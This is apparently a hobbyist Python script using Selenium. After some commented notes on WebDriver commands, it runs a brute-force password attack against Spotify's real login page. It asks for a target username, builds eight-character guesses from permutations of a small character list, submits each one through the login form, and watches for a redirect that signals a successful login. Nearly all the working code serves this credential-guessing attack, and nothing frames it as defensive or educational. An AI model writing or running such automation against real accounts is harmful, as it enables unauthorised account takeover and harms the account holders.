#*******************************Basic Webdriver commands***************************************************

#driver.get("https://geeksinhome.netlify.com") #to open a URL

#print(driver.page_source) #returns page HTML code

#print(driver.current_url) # returns the URL of the page

#print(driver.title) #title of the page

#driver.close() #closes currently open browsers(meaning tabs here)

#driver.quit() #closes all the open browsers(meaning tabs here)

#driver.find_element_by_xpath() #to subject a HTML element


#**********************************Navigation commands*********************************************

#driver.forward() #it will navigate to a forward page

#driver.back() #it will navigate to backward page

#**********************************Conditional commands*********************************************

# is_displayed()      #returns true or false based on status of the element
# is_selected()       #
# is_enabled()

#***************************************************************************************************
from selenium import webdriver
from time import *
from itertools import  combinations_with_replacement,permutations
import random
characters = ['rohith','1','5','6','4','8','9','@','#','$','.','\\','*']

#characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','~','`','!','@','#','$','%','^','&','*','(',')','_','-','+','=','{','[','}',']','|','\\',':',';','\"',"\'",'<',',','>','.','?','/']
username = input("Enter Targeted Username:")
driver = webdriver.Chrome(executable_path="C:\drivers\chromedriver_win32\chromedriver.exe")
# driver = webdriver.Firefox(executable_path="C:\drivers\geckodriver-v0.26.0-win64\geckodriver.exe")
driver.maximize_window()
driver.get("https://accounts.spotify.com/en/login/")
# #this will close the browser
flag = 'https://accounts.spotify.com/en/status'

login_flag = "not logged"


def findpassword(username, line):
    global login_flag
    if login_flag == 'not logged':
        driver.find_element_by_xpath(
            '//*[@id="login-username"]').send_keys(
            username)
        driver.find_element_by_xpath(
            '//*[@id="login-password"]').send_keys(line.strip())
        driver.find_element_by_xpath('//*[@id="login-button"]').click()

        try:
            sleep(0.6)
            driver.implicitly_wait(1)
            temp = driver.current_url
            driver.implicitly_wait(1)
            if temp == flag:
                login_flag = 'logged in'
                return True
            else:
                driver.find_element_by_xpath('//*[@id="login-username"]').clear()
                driver.find_element_by_xpath('//*[@id="login-password"]').clear()

        except (Exception, NameError):
            print("Error occured while executing function")
    else:
        return False

word_set = []

count = 1

for j in range(2,4):
    for word in permutations(characters, j):
        if len(''.join(list(word))) == 8:
            word_set.append(''.join(list(word)))

print(len(word_set))

print(word_set.index('rohith89'))

for guess in word_set:
    count+=1
    print(count)
    if findpassword(username,guess):
        print(guess)
        break

driver.quit()